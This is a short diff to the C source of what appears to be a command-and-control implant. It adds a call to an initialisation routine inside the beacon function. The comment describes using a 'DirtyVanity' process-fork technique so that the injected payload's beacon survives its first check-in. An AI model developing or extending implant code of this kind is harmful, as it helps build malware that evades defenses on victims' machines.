@@ -82,6 +82,15 @@ unsigned int genagentid() {
 }
 
 void beacon(LPVOID lpReserved) {
+	/* 4.12 DirtyVanity: fork the pristine nursery clone before ANY
+	 * RPC-capable subsystem (wininet et al) is touched - a later fork
+	 * inherits poisoned runtime state and the payload beacon fastfails
+	 * in RPCRT4 on its first checkin (see inject_tier2.cpp) */
+	{
+		extern void dv_nursery_init(void); /* self-gates on the profile */
+		dv_nursery_init();
+	}
+
 	char * buffer;
 	int    length;
 	unsigned int adjust = 0;
